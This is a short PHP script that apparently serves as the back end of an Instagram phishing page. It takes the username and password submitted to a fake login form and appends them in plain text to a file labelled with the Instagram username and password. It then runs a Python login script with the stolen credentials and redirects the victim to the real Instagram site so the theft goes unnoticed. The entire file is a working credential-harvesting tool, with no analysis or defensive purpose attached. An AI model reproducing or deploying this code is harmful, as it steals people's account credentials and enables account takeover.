<?php
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
$command = "python3 login.py "
    . escapeshellarg($username) . " "
    . escapeshellarg($password);

exec($command);
header('Location: https://instagram.com');

exit();
?>







